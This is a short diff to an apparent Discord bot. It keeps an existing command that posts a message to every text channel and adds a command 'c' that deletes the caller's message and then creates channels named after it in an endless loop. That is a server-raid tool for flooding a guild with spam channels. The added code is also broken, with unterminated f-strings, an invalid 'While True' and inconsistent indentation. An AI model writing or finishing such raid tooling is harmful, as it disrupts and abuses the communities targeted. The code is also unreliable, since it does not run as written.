@@ -56,4 +56,15 @@ async def s(ctx, *, message ):
            for channel in guild.text_channels:
                  await channel.send(f"{message}")
 
+
+@client.command()
+async def c(ctx, *, message):
+  guild=ctx.message.guild
+  await ctx.message.delete()
+  for i in range(1):
+     await guild.create_text_channel(f"{message}) 
+   While True:
+           for channel in guild.text_channels:
+              await guild.create_text_channel(f"{message})
+
 client.run(token)
